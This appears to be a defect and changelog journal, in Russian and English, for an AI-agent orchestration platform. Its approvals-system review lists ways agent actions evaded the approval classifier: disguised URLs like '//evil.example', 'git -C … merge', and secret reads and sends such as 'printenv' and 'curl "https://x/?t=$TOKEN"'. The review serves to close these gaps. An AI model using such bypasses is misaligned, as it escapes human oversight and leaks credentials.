# Недочёты и доработки — журнал

Сюда записываем каждый замеченный недочёт (сообщение пользователя, скриншот, собственная ошибка), чтобы была история и было что
дорабатывать. Отложенные идеи живут в [BACKLOG](./BACKLOG.md), план — в [roadmap](./roadmap.md).

**Правило.** Исправили недочёт — запись в этом файле идёт в том же коммите (или сразу следом). Не исправили или исправили лишь
частично — запись всё равно есть, со статусом `open` или `watching` и с тем, что осталось сделать. Запись короткая: что видел
человек, почему так вышло, что сделали (коммит), что осталось.

Статусы: `fixed` — исправлено и проверено тестами; `fixed (не проверено вживую)` — исправлено, живая проверка за человеком;
`watching` — исправлено, смотрим, повторится ли; `open` — причина не устранена.

Формат записи: `### ГГГГ-ММ-ДД — заголовок` · **Статус** · **Что было** · **Причина** · **Что сделали** · **Осталось**.

---

## 2026-10-25 (schedules)

### Задача по расписанию просит апрув на то, что входит в её работу
**Статус:** fixed (не проверено вживую).
**Что было.** Расписание формирует картинку с графиком, отправляет в Telegram и удаляет файл — а задача ждёт карточку апрува на удаление, хотя это часть задания и ночью отвечать некому.
**Причина.** У расписания не было своего уровня апрувов: задача шла по настройке проекта / глобальной.
**Что сделали.** Поле `Schedule.approvalMode` (ask / off / не задано; миграции для обеих баз): задача, которую запускает расписание (и продолжаемая «одна задача»), получает этот уровень, подзадачи следуют за ней;
в форме расписания — «Approvals for this schedule's tasks».
**Осталось.** Админ-инструмент `propose_schedule` пока не умеет это поле (меняется в Settings → Schedules). Само правило, которое сработало на удаление (`rm` вне корней агента или с переменной), не менялось.

## 2026-10-25 (backup / move)

### `aigentron backup` не включал папки проектов (`projects/<slug>`)
**Статус:** fixed (не проверено на реальном сервере; скрипты проверены в контейнерах Debian и Alpine).
**Что было.** В архив шли `workspace/` (проект по умолчанию), секреты, навыки, вложения, база, но не `<data>/projects/*` — память проектов (решения, факты), библиотека, результаты
(`deliverables`). Восстановление или переезд теряли их. Код (`repo/`, `worktrees/`) исключён намеренно, но проект без удалённого репозитория терял и код.
**Что сделали.** `projects/` в архиве (без `projects/*/repo`); `--with-repos` добавляет код и worktrees без `node_modules`/сборок; манифест хранит версию и каталог данных; восстановление
отказывается принимать архив более новой версии (`--force`) и предупреждает о другом каталоге данных; команды `aigentron export` / `aigentron import`, `--to` для scp; `docs/moving-servers.md`;
`scripts/test-infra.sh`.
**Осталось.** Postgres (compose) по-прежнему только вручную (`pg_dump`); сеансы Claude не переносятся (продолжение задачи начинает новый разговор); пути worktrees в строках задач при другом
каталоге данных не переписываются (только предупреждение).

## 2026-10-25 (Playwright)

### У агентов есть навык Playwright, а на сервере браузера нет
**Статус:** fixed (аддон проверен в контейнере Debian 12 aarch64; на сервере пользователя не проверялся).
**Что было.** MCP-сервер `playwright` засеян адресом `http://playwright-mcp:8931/sse` (сервис docker-compose). На установке без compose (bare-metal, минимальный профиль)
его нет: навык есть, инструментов нет. Аддон `browser` (видимый Chromium с профилем) для этого не подходит: он станет частью личного ассистента.
**Что сделали.** Отдельный аддон `playwright` (`infra/addons/playwright`): `@playwright/mcp` (версия закреплена) плюс свой Chromium, один юнит systemd на `127.0.0.1:8931`,
изолированные сессии; оркестратор направляет запись `playwright` на этот адрес, пока аддон включён, а `preview_worktree` отдаёт `localhost`; `aigentron addon` знает аддон
(статус по MCP, дополнение команд).
**Осталось.** Проверить на реальном сервере (systemd, Ubuntu AppArmor, память на 4 ГБ); образ для Docker-варианта не делали (там compose-профиль `mcp`).

## 2026-10-25 (MCP)

### Не получалось добавить MCP-сервер в формате другого клиента (arttron MCP)
**Статус:** fixed (не проверено вживую с arttron).
**Что было.** Форма «Add an MCP server» принимала один объект без обёртки и не знала форматов `{"mcpServers": {…}}`, `{url, headers}` без `type`,
`claude mcp add …`; вставленное сохранялось как есть и не работало. Команда на странице MCP endpoint не содержала токен при заданном `MCP_TOKEN`.
**Что сделали.** Разбор форматов (`packages/shared/src/mcp-config.ts`): обёртка `mcpServers` / `servers`, один объект, командная строка Claude Code, голый URL;
недостающий `type` дописывается, клиентские поля убираются; сервер нормализует так же; форма показывает, что поняла; страница MCP endpoint даёт команду с
заголовком токена и блок для `.mcp.json` / Cursor / LM Studio.
**Осталось.** Проверить на реальном `https://arttron.dev/api/mcp` (Bearer-ключ); OAuth-вход для коннекторов claude.ai без `?key=` не делали.

## 2026-10-25

### Коммит при красной проверке админ-навыков из-за `| tail` (повтор)
**Статус:** fixed (процесс). Проверка запускалась как `node scripts/check-admin-skills.mjs | tail -1 && git commit`: код выхода конвейера — у `tail`,
поэтому красная проверка не останавливала коммит (`5ad510d`, исправлено следующим). Правило: проверку запускать без конвейера
(`node scripts/check-admin-skills.mjs >/dev/null`), и только потом `&&` коммит. Файл `dashboard-guide.md` упирается в лимит 16 000 символов каждый раз,
когда в него добавляют строку: если ещё раз упрётся, разбить на два файла.

## 2026-10-22

### На телефоне не добавляются вложения при создании задачи
**Статус:** watching — исправлены найденные дефекты, воспроизвести на телефоне не удалось; нужны детали (модель, браузер, что видно на экране).
**Что было.** Пользователь: создание задачи на мобильном «так и не работает нормально, не добавляются вложения».
**Найдено в коде.** (1) Клиент разрешал любой файл до 95 МБ, а сервер принимает фото/PDF только до 10 МБ: ошибка приходила уже после создания
задачи, и задача оставалась без файлов, а повторная отправка создавала вторую. (2) Подготовка файла (`stage`) не ловила ошибки: при сбое файл
молча не попадал в список. (3) Поле выбора файла очищалось сразу после выбора: на части телефонов (Android, файлы из галереи / облака) это
делает файлы нечитаемыми, пока они готовятся и грузятся. (4) Не было индикации загрузки.
**Что сделали.** Лимит по типу файла и после сжатия фото; сбой подготовки и загрузки показывает, какой файл и почему; незавершённая задача
удаляется, текст и файлы остаются для повторной отправки; ход загрузки на кнопке; поле очищается при следующем открытии выбора.
**Осталось.** Если на телефоне по-прежнему не добавляется: модель и браузер, на каком шаге (меню «Attach», выбор, чип файла, создание),
текст ошибки. Живая камера (`CameraCapture`) на телефоне не проверялась.

## 2026-10-21

### Сырой HTML страницы ошибки Cloudflare в тексте ошибки дашборда
**Статус:** fixed (не проверено вживую) для отображения; **open** для самой причины 520.
**Что было.** Иногда вместо сообщения в интерфейсе появлялась целая страница «520: Web server is returning an unknown error».
**Причина.** `unwrap()` клали тело ответа в текст ошибки как есть; Cloudflare отдаёт 520, когда сервер за туннелем не отвечает
(перезапуск, перегрузка). Саму причину 520 не определили: нужен журнал сервера за момент ошибки.
**Что сделали.** `cleanErrorBody` в `lib/http.ts`: HTML-страница для 502/503/504/520–527 превращается в одну фразу, длинный текст
обрезается до 600 символов (`6928640`).
**Осталось.** Выяснить, почему сервер не отвечал (см. «Перегрузка сервера на t4g»).

### Селект «Approvals» растягивал шапку задачи
**Статус:** fixed (не проверено вживую).
**Что было.** Длинная подпись пункта «Inherit (no approvals, from the lead task “…”)» растянула шапку страницы задачи.
**Причина.** Подпись пункта включала название лид-задачи; ширина селекта не ограничена.
**Что сделали.** Короткие подписи в шапке, ширина до 11 rem, пояснение в подсказке (`76991d1`).

### Нет отступа между кнопкой «+ Subtask» и списком подзадач
**Статус:** fixed (не проверено вживую). Исправлено в `5b85431`: заголовок блока в обёртке с нижним полем.

### Лид получал только 500 символов ответа подзадачи
**Статус:** fixed (0.1.80). **Что было.** Лид передавал дальше только первый пункт длинного отчёта дизайнера.
**Причина.** `summarizeTask` резал финальный ответ до 500 символов, молча. **Что сделали.** До 4000 символов и явная пометка
об обрезке (`27cedba`).

### Ошибка `unrecognized_model … generate_session_title`
**Статус:** fixed (0.1.80), стоит проверить после обновления.
**Причина.** Claude CLI сам просит малую модель назвать сессию; шлюз не знает модель агента (`DS/deepseek-flash`).
**Что сделали.** Фиксированное название сессии (`title` в опциях SDK), лишний вызов пропадает (`a8182d5`).

### Задачи останавливались по времени и по шагам (`stalled`)
**Статус:** fixed частично (0.1.82); **open** — шаги и роль дизайнера.
**Что было.** Крупные задачи (дизайн, вёрстка лендинга) обрывались жёстким потолком 10 минут, даже когда агент активно работал.
**Что сделали.** Скользящее окно: пока агент выдаёт вывод, время продлевается до 60 минут; на потолке карточка апрува «разрешить
ещё N минут»; всё вынесено в Settings → Run limits (`c62e153`, `84ea877`).
**Осталось.** Лимит шагов 40 по-прежнему останавливает крупные задачи: поднимать `maxTurns` у исполнителей или резать работу
(подсказка в `task-splitting`). Дизайнер по шаблону read-only (`disallowedTools: Write, Edit`) и не может отдавать макеты
файлами: решить, дать ли ему запись в `work/` и `deliverables/`.

### Задачи падают даже по одной, сервис перезапускается каждые 5 минут (`oom-kill`)
**Статус:** fixed (не проверено вживую), нужен релиз 0.1.83 и своп на сервере.
**Что было.** Пользователь: «троттлинг работает плохо, задачи падают даже по одной». Журнал: `aigentron.service: Failed with result
'oom-kill'` каждые 5–6 минут, затем `Restart=on-failure`, задачи продолжаются и снова выбивают память (4 ГБ, без свопа; рядом
LiteLLM, браузер Playwright, `tsc`). Отсюда же 520 от Cloudflare.
**Причина.** Нехватка памяти, а не CPU. Защита 0.1.79–0.1.82 смотрела на load, свободную память лишь при старте и принудительно
стартовала через 10 минут даже при нехватке памяти. Ядро убивало самый большой процесс, systemd (`OOMPolicy=stop` по умолчанию) останавливал
всю службу.
**Что сделали.** Страж памяти: ниже `AGENT_OOM_GUARD_MB` (200) останавливается самый новый запуск, задача `stalled` с пояснением;
старт при нехватке памяти ждёт до часа, не 10 минут; агенты просят ядро убивать их первыми (`oom_score_adj 500`: обёртка `nice`,
`agent-exec.sh`, Codex); в unit `OOMPolicy=continue`; потолок кучи Node снова треть RAM; `metrics_report system` показывает память, своп и
предупреждает об отсутствии свопа; установщик напоминает про своп.
**Осталось.** Добавить своп на сервере и drop-in `OOMPolicy=continue` до обновления; рассмотреть, нужен ли LiteLLM в минимальном профиле
(Python-процесс съедает 0,5–1 ГБ) и браузер Playwright на 4 ГБ; параллельно лимит шагов 40 («Reached maximum number of turns») останавливает
задачи провайдера DS: поднять в Settings → Run limits.

### Перегрузка сервера на t4g.medium
**Статус:** watching (0.1.82), нужны замеры.
**Что было.** Система падала от загрузки CPU при нескольких агентах; позже сервер перезапускался и отвечал 520.
**Что сделали.** `AGENT_MAX_LOAD` и `AGENT_MIN_FREE_MEM_MB` (0.1.79); растянутые старты, учёт украденного CPU, `nice` для
агентов, лимит памяти Node, автоподбор параллельности, плашка «почему задача в очереди» (`26163be`, `7dd629f`, `cecb19f`, `054043b`).
**Осталось.** Посмотреть `metrics_report system` после обновления; на сервере у пользователя параллельность всё ещё 2, подходит 1;
если кредиты t4g на нуле — нужен другой тип инстанса.

## 2026-10-20 и раньше

### Релиз не доходил до публичного репозитория (теги `v0.1.69`, `v0.1.79`)
**Статус:** **open** (причина не найдена), обходной путь есть.
**Что было.** Коммит релиза попадал в публичный `main`, а тег и Release — нет («remote rejected … missing necessary objects»).
**Что сделали.** Повторный запуск сборки (0.1.69 → 0.1.70), а 0.1.79 выпущена в составе 0.1.80.
**Осталось.** Разобрать `publish/sync-public.sh` (порядок `git push` и пуша тега); удалить неопубликованный тег `v0.1.69` из
приватного `origin`.

### Описание релиза 0.1.81 содержит лишний блок про 0.1.80
**Статус:** **open.** Причина: файл `RELEASE_NOTES.txt` должен содержать одну версию, я дописал новую поверх старой. У `gh` нет
прав править релизы публичного репозитория, блок можно убрать вручную (Edit на GitHub). Файл исправлен (`d0e91a3`).

### В коммит попал резервный файл `*.bak`
**Статус:** fixed (`6cc78ee`), в релизы не попал. Причина: `sed -i.bak` на macOS. Правило: не использовать `sed -i`, править файлы
скриптами; перед коммитом смотреть `git status`.

### Коммиты проходили при красной проверке админ-навыков
**Статус:** fixed (процесс). Причина: цепочка команд через `;` вместо `&&`. Лимит 16 000 символов на файл админ-навыка упирался
несколько раз (`dashboard-guide.md`, `admin-tools.md`). Правило: проверка и коммит через `&&`; перед добавлением строки в навык —
`node scripts/check-admin-skills.mjs`.

## 2026-10-25 — review of export / MCP / schedule approvals / task list (fixed)

- Export/backup: data was filtered by name (folders called build/dist were lost) → code in its own inner archive, projects restored per entry, exact-name excludes.
- Memory guard and start holds fired on macOS (`os.freemem()` is not "available") → unknown memory disables them; 20 s grace after a stop.
- MCP: duplicate name was a 500, `__proto__`/`constructor` accepted, trailing-comma and backslash handling in the parser, multi-server Add left a half-done list without refresh.
- Dashboard: Esc in the full-screen conversation also closed a dialog; a JSON error body was cut so its message could not be read; `task:` file references with spaces; the create form deleted a task whose start answer was merely lost (a retry would run the work twice); bulk Cancel used a stale status and a rule different from the task page.
- Playwright add-on: a version bump did not restart a running unit; a failed check still wrote `enabled: true`; an old distro `nodejs` (<18) was not upgraded.
- Open (low): `dataset.pinned` is owned by two effects; `task:` references in message text are not checked against the subtask relation (matters once per-project access exists — see docs/plan-project-isolation.md).

## 2026-10-25 — "Sync now" showed ✕ after a successful sync (fixed)

The repository card read `ok` / `message` from the sync answer, but the server returns `{action, branch, head, detail, …}` (a failure is an HTTP error). So every successful sync looked like a failure with an empty message. The card now shows the server's `detail` and the short head with a ✓ (`syncSummary`, tested).

## 2026-10-25 — an agent could not `git pull` a project with an SSH key (fixed)

"Sync now" worked (the orchestrator fetches with the project's key and pinned host key), but an agent's own `git fetch` / `git pull` failed with `Host key verification failed`: agents hold no credentials, by design, and only `push_branch` had an orchestrator-side route. The git skill still said plain `git fetch` "authenticates itself". Now there is a `fetch_remote {branch?}` tool (no approval: it only downloads and moves no local branch), the skill and docs say to use it, and the agent merges `origin/<branch>` itself.

## 2026-10-25 — audit of skills and agents against projects (fixed)

- `git` skill: the workflow told agents to `git checkout develop` / `git pull origin develop` (wrong in a worktree, and `pull` cannot authenticate), the "Authentication" section claimed the token was baked into the git config and that plain `git fetch` works, and the reminder said `git merge` needs approval (it does not; only `git push` and force operations do). Rewritten around the project's base branch / isolation, `fetch_remote`, `push_branch`.
- `playwright` skill presented `project-dev` as "the base project": it is the Docker stack's sample app, not a registered project. Now says to use `preview_worktree` in any other project.
- Not changed, checked: `task-splitting` (names the project slug), the admin agent and its skills (projects, per-project libraries, repository access, `fetch_remote`), the renovation agents (docs projects: resources / workspace tools, no git), the stack skills (`nestjs`, `nextjs`, `postgres`, `elasticsearch`, `i18n`, `heroku`, `code-intel`: project-agnostic).
- Skills are only seen by agents that list them; the project's settings and the remote-git rule now travel in every code run's system prompt instead (see `agent/project-orientation.ts`).

## 2026-10-25 — `progress.md` showed up as a link in Telegram (fixed)

Telegram links anything shaped like `name.tld`, and `.md`, `.sh`, `.py`, `.rs`, `.zip` … are real top-level domains, so file names in an agent's message became links to websites. Messages are now sent with Telegram's HTML subset (`channels/telegram-html.ts`): file names and paths go into `<code>` (never linked), the usual Markdown (bold, italic, code, fenced code, headings, bullets, `[text](https://…)`) is shown as formatting, the rest is escaped, web addresses and e-mails are left alone. If Telegram refuses the markup the same text is sent plain.

## 2026-10-25 — a project's chat still received every task's approvals and questions (fixed)

0.1.90 narrowed the chat's commands, but an approval or question of a dashboard task that nobody answered on the page was still broadcast to EVERY allowed chat of every channel (`broadcastApproval`, `escalateQuestion`). They now go through `chatTargets` (`channels/project-chats.ts`): a project with its own chat is announced there only, and a chat owned by a project hears about no other project's tasks.

## 2026-10-25 — finding your Telegram id needed the pairing round-trip (added a helper)

The only way to learn a chat id was to enable the channel, write to the bot and find the yellow "is this you?" line. The add/edit channel form now has **Find my id**: with the token entered, wait for a message to the bot (`POST /channels/probe-sender`, a throw-away adapter that reads and confirms that one update so the running channel never treats it as a task), show who wrote what, ask whether to allow the id. A channel that is already running cannot be read twice, so there the waiting-chats (pairing) list is watched instead.

## 2026-10-25 — the add-ons refused Ubuntu 26.04 (fixed)

`sudo aigentron addon enable playwright` stopped with "this add-on supports Debian 11/12/13, Ubuntu 22.04/24.04 …" on Ubuntu 26.04: the supported systems were an exact list, so every new release was refused until someone edited it. Debian 11+ and Ubuntu 22.04+ are now accepted (a version newer than the tried ones gets a warning), library names are resolved (`name`, else `nameT64`, else skipped with a warning), and the browser self-test at the end of the install is what says whether it really works. Both add-ons (`playwright`, `browser`). Checked in an Ubuntu 24.04 container (dry run); 26.04 itself was not available to test.

## 2026-10-25 — a project's chat got its approvals late, or not at all while the dashboard was open (fixed)

Approvals and questions of a dashboard task waited ~10 s and were dropped when anyone had the dashboard open, also for a project that owns a chat. A project's own chat is its feed, so the request now goes there at once (and the sweep posts it there if the first send failed); the default project / a project without a chat keeps the delay and is announced only in free chats (none owned by a project). A project chat that is not among the channel's allowed chats is reported once in the log (the buttons could not be used there). The routing of approvals is now covered by a test (`channel-approval-routing.test.ts`).

## 2026-10-25 — a subtask's report showed as `you>` in its lead's conversation (fixed)

When the subtasks of a lead finished, the orchestrator woke the lead with a prompt holding their results, and the conversation showed that prompt as the person's message (`you>`), instructions to the lead included, however long the results were. The prompt is now built from one block per subtask (`tasks/subtask-report.ts`); the conversation shows each block as a message from the subtask's own agent (event kind `subtask_report`, `speaker` = that agent; only the lead's real subtasks count), leaves the instructions out, and keeps a person's message queued behind it as theirs. Messages with a speaker (subtask reports, discussion turns) fold to ten lines with "Show more" (`Collapsible`). Telegram messages are not folded.

## 2026-10-25 — every click and keystroke in the Playwright browser asked for an approval (changed)

Only capture tools and navigation to local addresses were free; `browser_click`, `browser_type`, `browser_fill_form`, `browser_press_key` … each opened an approval card, so a UI check of an agent's own preview produced dozens. The orchestrator now remembers where each task's browser is (`browserPageAfter`): on a blank or local page (the agent's own dev server) those interactions need no card; once the browser has been taken to a non-local site they are gated again. Still always gated: navigating to a non-local URL, `browser_evaluate` / `browser_run_code` (script that can send anything anywhere), `browser_file_upload`, `browser_install`. The state is in memory (a restart starts every task as "blank"). Same for the proxied browser.

## 2026-10-25 — a preview showed another project's site (fixed)

An agent made screenshots of its project and left a dev server running; asked for screenshots in another project, the next agent got the first project's pages. Two causes: stopping a preview killed only the `sh` that started it (`npm` and the dev server it spawned lived on, holding the port), and `preview_worktree` picked a port from its own list and called the preview ready as soon as ANYTHING accepted a connection there — the old server did. Now: (1) a port is used only if nothing answers on it before the start (busy ones are skipped and named; none left → a clear error), (2) once it answers, the listener is checked to be a descendant of the process we started (`lsof` / `ss` + `ps`; a foreign listener fails the start), (3) a preview is started in its own process group and stopped as a group (SIGTERM, SIGKILL after 5 s). The `playwright` skill tells agents to open only the address `preview_worktree` returned, never to start their own servers or reuse an open port, to check with a snapshot that the page is the project's, and to stop what they started. Covered by `preview.service.test.ts` (a real stranger on the first port, a real stop).

## 2026-10-25 — "No approvals" asked about nothing, merges and main included (changed)

In the no-approvals mode every dangerous action but credentials and admin proposals went ahead, including a merge and a push to main. The classifier now tags a verdict with a `guard` — `merge` (`git merge`, `gh pr merge`, a GitHub MCP merge), `main-branch` (a git push / pull / checkout / switch / reset / branch / tag … naming main or master; `push_branch` to main) or `outside` (a write tool, or a shell command that writes / moves / deletes, beyond the working directory) — and the mode never waives a guarded verdict. Ask mode asks about the same actions (a plain `git merge` and `git checkout main` are new there). Everything else stays free in the no-approvals mode; credentials / protected files and admin proposals stay asked as before.

## 2026-10-25 — a preview server stayed up after the screenshots (changed)

The preview dev server lived until the task settled or 15 idle minutes passed, so after a screenshot it kept a port and a process. Agents now have `stop_preview` next to `preview_worktree`, and the playwright skill makes it a rule: one process, started once per check, stopped right after the screenshots (the stop at task end stays as a safety net).

## 2026-10-25 — the General settings tab was one page of 18 cards (regrouped)

Audit of Settings → General: eleven stand-alone cards plus a seven-card form, on one page, mixing the dashboard's look, upkeep, how agents work and who may get in. Regrouped by what the person is doing: **General** (Display, Alert sound, Task titles, Version & updates, Disk & cleanup), **Work** (Approvals, Run limits, Repository, Verification gate, Task queue, Approval timeout, Agent instructions, Escalations), **Security** (sign-in + two-factor, Signed-in devices, Allowed domains, Cloudflare Access, Web server); MCP servers + MCP endpoint share one **MCP** tab, Voice + Vision one **Voice & vision** tab, Signed-in devices moved into Security. The settings form (`GeneralSettingsForm`) takes `sections` and saves only the settings of the cards it shows, so two tabs can never overwrite each other's values. Every "Settings → …" path in the UI texts, server messages, admin skills and docs was updated.

## 2026-10-25 — a status filter listed subtasks; the project was a filter chip, not the page's context (fixed)

Choosing a status in the task list showed every task of that status at every level — subtasks included. The list now stays top-level under a status filter: a task matches when its own status or one of its subtasks' is the chosen one (a blocked subtask under a finished parent is found through the parent, whose row carries the subtask counts); a search or a type filter still looks at every level. The numbers on the status chips use the same rule, and both chip rows follow the project. The project moved from a chip row inside the list card to a selector at the top of the page — the page's context: the list, the counts and the "New task" form (which no longer asks for a project while one is chosen) all belong to it; "All projects" keeps the old picker in the form.

## 2026-10-25 — usage stats had no project and no day view (added)

The Stats page summed everything by provider. It now has three views — by provider, by project (a click picks the project), by day (columns per day in the viewer's time zone, quiet days as zeros) — a project selector, and tick boxes that switch Sessions / Requests / Input / Output / Cache / Est. cost off (remembered per browser; the charts follow the token ones). The server builds all three from the same sessions (`StatsService.usageByProvider`, `project` and `tz` parameters); the admin's `usage_report` takes `project` too.

## 2026-10-25 — review of the approvals system by Fable (fixed unless noted)

A read-only review of the approvals system (classifier, modes, guards, browser rules, chat delivery, hook). Confirmed defects and what was done:

- **High — browser addresses.** `//evil.example`, `https:\\evil.example`, `https:/evil.example`, a tab or space inside the scheme were read as "a path on this page" and navigated for free, and the page was then tracked as local, so clicks and typing there were free too. The address is now read like the browser reads it (`classifyNavUrl`: control characters and tabs dropped, `\` as `/`, parsed with `URL`); only `localhost`-class hosts are free; a path on the current page leaves the tracked state as it was.
- **High — tracked page.** Going back and tab changes now put the browser on "not known to be local" until the next local navigation, and the hook sends every navigation / back / tab call to the orchestrator (a benign navigation used to be allowed by the hook alone, so the state only ever moved on gated calls).
- **High — merge guard.** `git -C … merge`, `git --no-pager merge`, `git -c … merge` were not seen. Git commands are now read by a small command reader (`packages/shared/src/shell-guard.ts`: quotes, `;` `&&` `|`, heredocs, `cd`, wrappers, `sh -c`, `$( )`) instead of regular expressions on the whole line.
- **High — protected paths.** A relative `.github/workflows/ci.yml` or `.git/hooks/…` was free for Write, Codex `apply_patch` and the shell, and `rm -rf .git` was not "hard". Paths are resolved against the working directory first; a shell command that writes, moves or deletes a protected / credentials file is `hard`; `git config` that makes git run a program (hooks path, credential helper, alias …) is `hard`.
- **High — credentials.** `printenv`, `env`, `export -p`, a variable named like a secret (`$CLAUDE_CODE_OAUTH_TOKEN`, `$ANTHROPIC_API_KEY` …), `~/.claude/.credentials.json` and `cat ".env"` were free, and `curl "https://x/?t=$TOKEN"` went out without a card. All are `hard` now; an outbound request with a value taken from the shell is asked about.
- **Medium — outside the working directory.** Quotes, `$HOME`, `sh -c`, `find -delete`, `curl -o`, `wget -O`, `tar -C`, `sed --in-place`, interpreters writing files are now caught; a path that cannot be known counts as outside; only the destination of `cp` / `ln` / `rsync` is judged (copying FROM `/etc/hosts` is free).
- **Medium — main / master.** Quoted refs, `\`-newline, `--all` / `--mirror`, `fetch origin main:main`, variable refs, GitHub MCP writes naming main (`push_files`, `create_or_update_file` …) are guarded. Not guarded (cannot be told from the text): `git push origin HEAD` while main is checked out.
- **Medium — noise.** `git checkout -b x origin/main`, `git switch -c x main`, `git branch x main`, `git merge-base`, a commit message that says "merge main" no longer trigger a guard.
- **Medium — double decision.** `decide()` read, checked and then wrote unconditionally, so the dock, a Telegram button and a 👍 could all "win" (and a continuation re-ran the task twice). The decision is now claimed with a guarded update; the loser gets "already resolved" and nothing else happens (`approvals-decide.test.ts`).
- **Low — fixed:** the hook secret is compared in constant time; a GitHub tool ending in a read verb but writing (`mark_all_notifications_read`) is no longer read-only; an approval of a task that no longer exists is announced nowhere (it used to go to every allowed chat).
- **Low — left as it is:** in the no-approvals mode `create_task` into another project is waved through (the new task follows the target project's own mode); a project whose chat is not allowed is reported once in the log.

## 2026-10-25 — a channel bound to a project still showed every task, and its admin described the whole fleet (fixed)

Reported: a new channel was tied to a project, yet the chat showed all tasks of the service and the admin greeted with everything it knew about all agents. Two causes. (1) A chat counted as bound only when the project named BOTH the channel and a chat id; naming just the channel (what "tie the channel to the project" means) bound nothing. Now a project that names the channel without a chat owns every chat of it (a project naming the chat itself wins; two claiming the same thing = nothing narrowed), also for who is told about approvals and questions. (2) The admin agent has the platform's tools whatever chat it is in. In the chat of a project that is not the default one the admin is now that project's assistant: its tools see only that project's tasks / usage / notes, the agent list is the project's own agents, platform administration is refused, and its prompt forbids touring the platform (`agent/admin-scope.ts`, tested). This is a prompt AND tool limit, not an isolation boundary: an agent that has a shell can still read the server (see docs/plan-project-isolation.md for the OS-level separation).

## 2026-10-25 — a project tied to a channel still got its escalations in the main chat (fixed)

Reported: with a channel tied to a project, messages kept arriving in the main one. The "notification channel + chat" of a project fell back to the installation's values FIELD BY FIELD: a project that named only a channel got that channel together with the GLOBAL chat id (documented in a test as "field by field, like the global fallback"), so an escalation (a blocked / stalled / failed task nobody had a chat thread for) was sent into the wrong conversation. Now the project's channel comes with its own chat or, with none, stands for every allowed chat of that channel; the installation's pair is used only when the project names no channel at all. Also: platform notices for the operators (disk space …) no longer go to chats a project owns. What a task already started in a chat keeps is its thread: its results, replies and approvals stay in the chat it was started in (binding a channel later does not move tasks); a task started from the dashboard has no thread and is announced through the project's channel.

## 2026-10-26 — a task from Telegram went to the admin by mistake; the channel's default agent did nothing (fixed)

Writing an agent's name alone in a chat (`/admin`) makes it the chat's agent for NEW tasks and the chat never forgot it: the next plain message started a task for the admin. The confirmation did not say who got the task, and there was no way back short of choosing another agent. Also, the Default agent field of a channel was only displayed, never applied. Now: the confirmation names the agent ("→ pm", with a hint when it is the chat's own choice), `/agent default` forgets the choice, the order is message → chat → bound project's Default agent → channel's Default agent → main lead, the New task form's first option names the PROJECT's default (it used to show the global one), and the New project window asks for the Default agent.

## 2026-10-26 — requests of a project with its own chat skipped "the dashboard first" (fixed)

0.1.93 made a project's own chat get its approvals and questions immediately, even while someone had the dashboard open. The agreed behaviour is the other one: with a browser in front, the request goes to the dashboard and reaches the chats only if nobody reacted within 10 s; with no browser in front it goes to the chats at once. This is now one rule (`whenUnanswered`) for approvals, questions and the "blocked / stalled / failed" notices of tasks without a chat thread, for the project's chat and for the free chats alike. A request that was answered on the page in time never reaches the chats. (Before 0.1.93 a focused browser also meant "never to the chats"; it now means "to the chats after 10 s of no reaction".)

## 2026-10-26 — no sound for a new message of an agent (added)

Only approvals and questions made a sound. The conversation now plays one (default: a short "ping") for a new MESSAGE of an agent — its words and its answer (`assistant`, `result`, `discussion`, `subtask_report` lines that arrive live) — and never for its steps (`tool_use`, `tool_result`, `delegation`, system notes, errors), whichever of "all steps" / "messages only" the conversation shows. Options (per browser, Settings → General → Alert sounds → New messages): on/off, the sound (also your own), only the final answer, only when the tab is not in front; one volume for both sounds; lines in a burst make one sound (3 s).

## 2026-10-26 — review of the channels system by Fable (fixed unless noted)

- **High — `propose_task` in a project chat** could start a standalone task of the DEFAULT project with any agent, and the card went to the client's own chat. It now always stays in the project (never standalone) and only for the project's agents.
- **High — the default project owned the operator chat.** The installation's escalation pair is copied into the default project's row, so the operator's chat looked "bound to Default": other projects' escalations, approvals and questions reached no chat at all. The default project never owns a chat now.
- **High — archiving a project freed its chat**, which then saw every project and received everyone's notices. An archived project keeps its chat (new tasks in it are refused as before).
- **Medium:** `/discuss` from a bound chat made the discussion in the default project (now in the project); a reload rebuilt the adapter from a stale cursor, so a message sent just before saving the channel form could create a task twice (the row is re-read after the old adapter's last cursor write); strangers' files and voice messages were downloaded (20 MB each) before the allow-list was asked (now asked first, nothing is fetched or answered); the project admin's `look_at` / `video_digest` could read any task's attachments (scoped to its own task); a bound chat saw the whole fleet in `/agents`, the command menu, by address and in `/agent` (now only the project's agents and the admin); the ⏹ Cancel button had no ownership check (only a chat the task speaks in); a thread linked before a chat was bound kept delivering into it (a chat owned by another project hears nothing about a task of a different project).
- **Low — fixed:** a channel-wide escalation linked the task to every chat (it is linked only when there is a single chat); a chat's sticky agent that no longer exists broke every message (the default applies); the Telegram formatter mangled text containing its private markers and `__init__.py` (bold); "Find my id" now refuses a token a running channel already uses; the project settings wording.
- **Left as it is:** `lastUpdateId` is written by a read-modify-write of the whole config (a save racing the cursor can revert the form's change — rare, the next save fixes it); "blocked / stalled / failed" notices of a task are lost if the server restarts inside the 10 s window; two projects naming the same chat leave the chat un-narrowed (deliveries are still narrowed); "Stop waiting" in Find my id does not abort the server-side wait (up to 25 s).

## Number inputs showed the browser's spin arrows; no way to move one agent between installations (fixed)
- Number fields had the native up/down arrows, out of style with the design — hidden globally (`globals.css`); typing and the keyboard arrows still work.
- An agent could be moved only with the whole server (`aigentron export/import`). Added **Agents → Export / Import**: one JSON with the agent, its custom skills and the ticked learned skills; import plans first (new / same / different / blocked), never replaces `admin` or a shipped skill name, drops `createTasks`, respects the learned-skills budget, snapshots anything it overwrites.

## No-approvals mode asked about merging the agent's own task branches (fixed)
`git merge agent/task-…` inside a task worktree hit the `merge` guard. Now such a merge (only `agent/task-*` refs, shell inside `…/worktrees/…`) is routine; any other merge, a merge outside a worktree, a dynamic ref, or anything touching main/master is still asked about.

## `propose_task` asked for approval in No-approvals mode (fixed)
Starting a task for an agent is the agent's own work like `create_task`; in No-approvals mode it goes ahead without a card (a project's admin is scoped to that project's agents). Asking mode is unchanged.

## Task branches were named by the task id only (changed)
`agent/task-cmvow6fbs006ks5p85b6yvhs1` told nobody what the branch was for. New tasks get `agent/<short-title>-<last 6 of the id>` (filler words dropped, Cyrillic transliterated, at most 4 words / 28 characters, e.g. `agent/fix-login-button-6yvhs1`); with an unusable title the old form is kept. Existing branches keep their names. Maintenance (report / cleanup) finds both forms — a readable branch through the task's stored branch; one that no task owns is never listed or deleted. The "own task branch merge is routine" rule accepts both.

## «The checklist is ready in the answer above» — and there was no answer (fixed)
